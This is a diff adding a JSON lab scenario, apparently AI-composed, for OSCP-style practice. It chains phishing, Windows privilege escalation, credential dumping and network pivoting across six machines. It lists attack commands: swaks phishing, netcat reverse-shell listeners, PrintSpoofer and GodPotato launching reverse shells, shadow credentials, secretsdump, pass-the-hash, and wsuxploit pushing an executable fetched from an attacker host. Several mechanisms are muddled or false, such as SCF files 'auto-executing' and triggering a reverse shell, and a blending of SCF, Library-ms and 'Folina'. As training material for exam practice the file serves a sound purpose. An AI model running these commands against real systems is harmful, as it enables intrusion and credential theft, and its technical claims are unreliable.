@@ -1,0 +1,433 @@
+{
+  "id": "phishing-to-pivot",
+  "title": "Phishing to Pivot",
+  "category": "multi-vector",
+  "source": ["Relia", "HTB Outdated"],
+  "designed_by": "ai-composite",
+  "description": "Multi-vector chain: swaks phishing from MAIL (Linux) → Library-ms/Folina victim on WK01 (Windows) → shadow credentials → LOGIN pivot (dual-NIC) → DC sweep. Includes FILES (PS transcripts) and WEBBY (WSUS) for credential harvesting.",
+  "introduction": "This scenario teaches client-side attacks and pivoting from phishing to domain compromise. OSCP tests your ability to chain multiple attack vectors.",
+  "mental_model": "Phishing + pivot: SCF/Library-ms triggers BITS on share open. Shadow credentials persist without password change. Dual-NIC hosts bridge networks.",
+  "key_principles": [
+    "SCF files auto-execute when victim opens SMB share",
+    "Shadow credentials add key without changing password",
+    "PS transcript history often contains admin creds",
+    "Chisel reverse tunnel pivots through dual-NIC host",
+    "WSUS MITM delivers malicious update as SYSTEM"
+  ],
+
+  "indicators": {
+    "difficulty": 8,
+    "cognitive_load": 8,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 5,
+    "time_pressure": 8
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007", "TA0008"],
+    "techniques": [
+      {"id": "T1566.001", "name": "Phishing: Spearphishing Attachment"},
+      {"id": "T1574.001", "name": "Hijack Execution Flow: DLL Search Order"},
+      {"id": "T1197", "name": "BITS Jobs"},
+      {"id": "T1134.002", "name": "Token Impersonation"},
+      {"id": "T1550.002", "name": "Pass the Hash"},
+      {"id": "T1572", "name": "Protocol Tunneling"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 5, "linux": 1},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": true
+  },
+
+  "technique_tags": [
+    "swaks", "phishing", "library-ms", "folina", "shadow-credentials",
+    "whisker", "certipy", "chisel", "ligolo-ng", "psexec", "secretsdump",
+    "wsus", "ps-transcripts", "evil-winrm"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "low",
+    "recommended_order": 18
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"},
+    {"id": "internal", "cidr": "192.168.50.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "mail",
+      "label": "MAIL",
+      "ip": "10.10.10.100",
+      "os": "Linux",
+      "role": "Phishing Server",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 25,
+          "name": "SMTP",
+          "version": "Postfix",
+          "vulnerabilities": [
+            {"type": "misconfig", "summary": "Open relay / swaks phishing delivery", "leads_to": "phishing-campaign"}
+          ],
+          "commands": [
+            {"cmd": "swaks --to victim@corp.local --from admin@corp.local --server 10.10.10.100 --header 'Subject: Urgent Update' --attach library-ms.scf", "rationale": "Why: Deliver SCF that triggers BITS when victim opens share"}
+          ]
+        },
+        {
+          "port": 80,
+          "name": "HTTP",
+          "version": "nginx",
+          "vulnerabilities": [
+            {"type": "phishing", "summary": "Hosts malicious SCF/Library-ms files for BITS download", "leads_to": "wk01-compromise"}
+          ],
+          "commands": [
+            "curl http://10.10.10.100/library-ms.scf",
+            "# SCF triggers BITS download of payload from attacker"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "www-data",
+          "to": "root",
+          "technique": "Docker escape or cron writable",
+          "commands": [
+            "linpeas.sh",
+            "cat /etc/crontab",
+            "# Exploit writable cron or docker socket"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "wk01",
+      "label": "WK01",
+      "ip": "10.10.10.101",
+      "os": "Windows",
+      "role": "Phishing Victim",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "client-side", "summary": "Library-ms/Folina SCF triggers BITS → reverse shell", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "# Victim opens share, SCF auto-executes",
+            "nc -lvnp 443"
+          ]
+        },
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "WinRM with creds from shadow credentials", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "evil-winrm -i 10.10.10.101 -u svc_phish -p '<password>'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "svc_phish",
+          "to": "SYSTEM",
+          "technique": "SeImpersonate → PrintSpoofer",
+          "commands": [
+            "whoami /priv",
+            {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: SeImpersonate to SYSTEM via print spooler"},
+            "PrintSpoofer64.exe -c \"c:\\windows\\temp\\reverse-shell.exe\""
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "svc_phish", "type": "password", "source": "Shadow credentials via Whisker/Certipy", "unlocks": ["login-rdp"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "login",
+      "label": "LOGIN",
+      "ip": "10.10.10.102",
+      "os": "Windows",
+      "role": "Pivot (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {
+          "port": 3389,
+          "name": "RDP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "RDP with svc_phish creds", "leads_to": "pivot-access"}
+          ],
+          "commands": [
+            "xfreerdp /u:svc_phish /p:'<password>' /v:10.10.10.102",
+            "chisel server -p 8000 --reverse"
+          ]
+        },
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SMB with domain creds for lateral movement", "leads_to": "dc-sweep"}
+          ],
+          "commands": [
+            "nxc smb 192.168.50.0/24 -u svc_phish -p '<password>' --gen-relay-list targets.txt"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "svc_phish",
+          "to": "SYSTEM",
+          "technique": "SeImpersonate → GodPotato",
+          "commands": [
+            "GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\""
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "admin", "type": "password", "source": "PS transcripts from FILES", "unlocks": ["dc02", "webby"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "dc02",
+      "label": "DC02",
+      "ip": "192.168.50.10",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "pth", "summary": "Evil-WinRM with admin hash from FILES", "leads_to": "domain-admin"}
+          ],
+          "commands": [
+            "evil-winrm -i 192.168.50.10 -u Administrator -H '<ntlm_hash>'"
+          ]
+        },
+        {
+          "port": 389,
+          "name": "LDAP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "LDAP enumeration with domain creds", "leads_to": "recon"}
+          ],
+          "commands": [
+            "nxc ldap 192.168.50.10 -u admin -p '<password>' --users"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "files",
+      "label": "FILES",
+      "ip": "192.168.50.21",
+      "os": "Windows",
+      "role": "File Server",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SMB share with PS transcript history", "leads_to": "admin-creds"}
+          ],
+          "commands": [
+            "smbclient //192.168.50.21/Users -U svc_phish",
+            {"cmd": "get 'admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'", "rationale": "Why: PS history often contains plaintext creds"}
+          ]
+        },
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "WinRM with admin creds from transcripts", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "evil-winrm -i 192.168.50.21 -u admin -p '<password-from-transcript>'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "admin",
+          "to": "SYSTEM",
+          "technique": "Backup Operators → reg save → secretsdump",
+          "commands": [
+            "reg save HKLM\\SAM c:\\windows\\temp\\sam.save",
+            "reg save HKLM\\SYSTEM c:\\windows\\temp\\sys.save",
+            {"cmd": "impacket-secretsdump -sam sam.save -system sys.save LOCAL", "rationale": "Why: Backup Operators can dump SAM for hashes"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "admin", "type": "password", "source": "PS transcript ConsoleHost_history.txt", "unlocks": ["dc02", "webby"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "webby",
+      "label": "WEBBY",
+      "ip": "192.168.50.22",
+      "os": "Windows",
+      "role": "WSUS Server",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 8530,
+          "name": "WSUS",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "rce", "cve": "CVE-2020-1013", "summary": "WSUS MITM / malicious update", "leads_to": "SYSTEM"}
+          ],
+          "commands": [
+            "wsuxploit.py 192.168.50.22 8530 http://<kali-ip>/malicious.cab"
+          ]
+        },
+        {
+          "port": 80,
+          "name": "HTTP",
+          "version": "IIS",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "IIS with admin creds for WSUS config", "leads_to": "wsus-recon"}
+          ],
+          "commands": [
+            "curl -u admin:<password> http://192.168.50.22/wsus"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "admin",
+          "to": "SYSTEM",
+          "technique": "WSUS malicious update → runs as SYSTEM",
+          "commands": [
+            {"cmd": "wsuxploit.py 192.168.50.22 8530 http://<kali-ip>/rev.exe", "rationale": "Why: WSUS MITM delivers malicious update as SYSTEM"},
+            "nc -lvnp 443"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "mail",
+      "to": "wk01",
+      "technique": "Phishing (Library-ms / Folina)",
+      "requires": "MAIL server access for swaks",
+      "pivot": false,
+      "path_ids": ["path-main"],
+      "commands": [
+        "swaks --to victim@corp.local --from attacker@corp.local --server 10.10.10.100 --attach @config.Library-ms",
+        "# Victim opens email → SCF/Library-ms triggers reverse shell",
+        "nc -lvnp 443"
+      ]
+    },
+    {
+      "from": "wk01",
+      "to": "login",
+      "technique": "Shadow credentials → RDP",
+      "requires": "Certipy/Whisker shadow credential on WK01",
+      "pivot": "LOGIN dual-NIC",
+      "path_ids": ["path-main"],
+      "commands": [
+        {"cmd": "certipy shadow auto -u svc_phish -p '<password>' -d corp.local -dc-ip 192.168.50.10", "rationale": "Why: Add shadow credential for persistence without password change"},
+        "xfreerdp /u:svc_phish /p:'<password>' /v:10.10.10.102"
+      ]
+    },
+    {
+      "from": "login",
+      "to": "dc02",
+      "technique": "Chisel pivot + PtH to DC",
+      "requires": "SYSTEM on LOGIN (dual-NIC), admin hash from FILES",
+      "pivot": "LOGIN dual-NIC",
+      "path_ids": ["path-main"],
+      "commands": [
+        {"cmd": "chisel server -p 8000 --reverse", "rationale": "Why: Pivot tunnel through dual-NIC host to reach internal"},
+        "# On LOGIN: chisel client <kali>:8000 R:socks",
+        "proxychains evil-winrm -i 192.168.50.10 -u Administrator -H '<ntlm_hash>'"
+      ]
+    },
+    {
+      "from": "login",
+      "to": "files",
+      "technique": "SMB with domain creds to FILES",
+      "requires": "svc_phish domain creds, tunnel via LOGIN",
+      "pivot": "LOGIN dual-NIC",
+      "path_ids": ["path-files"],
+      "commands": [
+        "proxychains smbclient //192.168.50.21/Users -U svc_phish",
+        "get 'admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'"
+      ]
+    },
+    {
+      "from": "login",
+      "to": "webby",
+      "technique": "Admin creds to WSUS server",
+      "requires": "admin creds from FILES PS transcript, tunnel via LOGIN",
+      "pivot": "LOGIN dual-NIC",
+      "path_ids": ["path-webby"],
+      "commands": [
+        "proxychains evil-winrm -i 192.168.50.22 -u admin -p '<password-from-transcript>'",
+        "wsuxploit.py 192.168.50.22 8530 http://<kali-ip>/rev.exe"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {
+      "id": "path-main",
+      "name": "Phishing → Shadow Creds → Pivot → DC",
+      "color": "#6bb8cc",
+      "steps": ["mail", "wk01", "login", "dc02"],
+      "description": "swaks phishing → Library-ms/Folina → WK01 shell → shadow credentials → LOGIN pivot → DC sweep"
+    },
+    {
+      "id": "path-files",
+      "name": "Pivot → FILES (PS transcripts)",
+      "color": "#e8a87c",
+      "steps": ["login", "files"],
+      "description": "LOGIN pivot → FILES SMB → PS transcript → admin creds → secretsdump"
+    },
+    {
+      "id": "path-webby",
+      "name": "Pivot → WEBBY (WSUS)",
+      "color": "#85e89d",
+      "steps": ["login", "webby"],
+      "description": "LOGIN pivot → admin creds → WEBBY WSUS CVE-2020-1013 → SYSTEM"
+    }
+  ]
+}
